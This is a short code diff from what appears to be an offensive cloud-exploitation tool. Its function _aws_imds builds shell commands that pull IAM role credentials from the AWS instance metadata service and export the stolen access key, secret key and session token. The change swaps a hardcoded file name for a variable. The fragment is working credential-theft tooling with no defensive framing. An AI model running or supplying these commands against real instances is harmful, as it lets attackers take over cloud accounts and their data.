@@ -47,9 +47,9 @@ def _aws_imds(outfile: str, lhost: str) -> CloudResult:
         "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" "
         f"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE | tee {outfile}\n\n"
         "# Extract credentials and export:\n"
-        "export AWS_ACCESS_KEY_ID=$(jq -r .AccessKeyId credentials.json)\n"
-        "export AWS_SECRET_ACCESS_KEY=$(jq -r .SecretAccessKey credentials.json)\n"
-        "export AWS_SESSION_TOKEN=$(jq -r .Token credentials.json)"
+        f"export AWS_ACCESS_KEY_ID=$(jq -r .AccessKeyId {outfile})\n"
+        f"export AWS_SECRET_ACCESS_KEY=$(jq -r .SecretAccessKey {outfile})\n"
+        f"export AWS_SESSION_TOKEN=$(jq -r .Token {outfile})"
     )
     return CloudResult(
         command=cmd,
